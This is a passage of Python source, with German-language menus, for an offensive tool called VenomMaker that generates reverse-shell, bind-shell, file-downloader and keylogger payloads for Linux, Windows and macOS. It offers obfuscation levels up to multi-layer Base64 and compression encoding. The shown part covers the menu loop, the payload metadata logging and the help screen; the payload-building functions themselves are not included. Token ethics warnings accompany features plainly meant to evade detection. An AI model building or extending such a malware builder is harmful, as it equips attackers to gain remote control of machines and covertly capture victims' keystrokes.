            print(f"{Fore.WHITE}│ 4. Keylogger läuft im Hintergrund                   │")
            
        print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────┘")
        
        print(f"\n{Fore.YELLOW}[!] WICHTIG:")
        print(f"{Fore.WHITE}• Teste Payloads immer zuerst in VMs/Labs")
        print(f"{Fore.WHITE}• Halte dich an lokale Gesetze und Ethik-Richtlinien")
        print(f"{Fore.WHITE}• Verantwortungsvoll nutzen!")

    def run(self):
        """Hauptfunktion"""
        self.banner()
        if not self.ethical_warning():
            return
        
        while True:
            self.show_payload_menu()
            
            choice = input(f"\n{Fore.YELLOW}venom@maker:~$ ").strip().lower()
            
            if choice == '99':
                print(f"{Fore.YELLOW}[*] Beende VenomMaker...")
                break
            elif choice == 'b':
                break
            elif choice == 'h':
                self.show_help()
            elif choice in self.payload_types:
                # Payload-Konfiguration sammeln
                config = self.get_payload_config(choice)
                
                # Payload generieren
                print(f"\n{Fore.CYAN}[*] Generiere Payload...")
                payload = self.generate_payload(choice, config)
                
                if payload:
                    # Payload speichern
                    file_hash = self.save_payload(payload, config['filename'])
                    
                    if file_hash:
                        print(f"{Fore.GREEN}[✓] Payload erfolgreich generiert!")
                        
                        # Anleitung anzeigen
                        self.show_usage_instructions(choice, config, config['filename'], file_hash)
                        
                        # Metadaten speichern
                        self.save_metadata(choice, config, file_hash)
                    else:
                        print(f"{Fore.RED}[ERROR] Konnte Payload nicht speichern")
                else:
                    print(f"{Fore.RED}[ERROR] Konnte Payload nicht generieren")
                
                input(f"\n{Fore.WHITE}[ENTER] Zurück zum Menü...")
            else:
                print(f"{Fore.RED}[!] Ungültige Auswahl")

    def save_metadata(self, payload_type, config, file_hash):
        """Speichert Metadaten über generierte Payloads"""
        metadata_file = "venommaker_metadata.json"
        metadata = []
        
        if os.path.exists(metadata_file):
            try:
                with open(metadata_file, "r") as f:
                    metadata = json.load(f)
            except:
                metadata = []
        
        entry = {
            "timestamp": datetime.now().isoformat(),
            "payload_type": self.payload_types[payload_type]["name"],
            "filename": config["filename"],
            "hash": file_hash,
            "platform": config["platform"],
            "obfuscation": config["obfuscation"],
            "config": {k: v for k, v in config.items() if k not in ['filename', 'platform', 'obfuscation']}
        }
        
        metadata.append(entry)
        
        try:
            with open(metadata_file, "w") as f:
                json.dump(metadata, f, indent=2, ensure_ascii=False)
        except:
            pass

    def show_help(self):
        """Zeigt Hilfemenü"""
        self.banner()
        
        help_text = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
{Fore.CYAN}║                  VENOMMAKER HELP                       ║
{Fore.CYAN}╠══════════════════════════════════════════════════════════╣
{Fore.WHITE}║ VenomMaker v{self.version} - Advanced Payload Generator       ║
{Fore.WHITE}║                                                        ║
{Fore.YELLOW}║ PAYLOAD TYPES:                                         ║
{Fore.WHITE}║   1. Reverse Shell  - Ziel verbindet zu dir            ║
{Fore.WHITE}║   2. Bind Shell     - Du verbindest zu Ziel            ║
{Fore.WHITE}║   3. File Downloader - Lädt Datei von URL              ║
{Fore.WHITE}║   4. Keylogger      - Zeichnet Tastatureingaben auf    ║
{Fore.WHITE}║                                                        ║
{Fore.YELLOW}║ OBFUSCATION LEVELS:                                   ║
{Fore.WHITE}║   1. Minimal   - Keine Obfuscation                     ║
{Fore.WHITE}║   2. Basic     - Variablen umbenennen                  ║
{Fore.WHITE}║   3. Advanced  - Base64 + Kompression                  ║
{Fore.WHITE}║   4. Extreme   - Mehrschichtige Obfuscation            ║
{Fore.WHITE}║                                                        ║
{Fore.YELLOW}║ PLATFORMS:                                            ║
{Fore.WHITE}║   1. Linux/Unix  - Für Linux-Systeme                   ║
{Fore.WHITE}║   2. Windows     - Für Windows-Systeme                 ║
{Fore.WHITE}║   3. macOS       - Für Apple Macs                      ║
{Fore.WHITE}║   4. Cross-Platform - Universell                       ║
{Fore.CYAN}╠══════════════════════════════════════════════════════════╣
{Fore.YELLOW}║ ETHICAL GUIDELINES:                                   ║
{Fore.WHITE}║ • Nur auf eigenen Systemen testen                      ║
{Fore.WHITE}║ • Nur mit ausdrücklicher Erlaubnis                     ║
{Fore.WHITE}║ • Keine illegalen Aktivitäten                          ║
{Fore.WHITE}║ • Gesetze beachten (§202a StGB)                        ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════╝
"""
        print(help_text)
        input(f"\n{Fore.WHITE}[ENTER] Zurück zum Menü...")

if __name__ == "__main__":
    try:
        vm = VenomMaker()
        vm.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] VenomMaker durch Benutzer beendet")
    except Exception as e:
        print(f"{Fore.RED}[CRITICAL ERROR] {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()
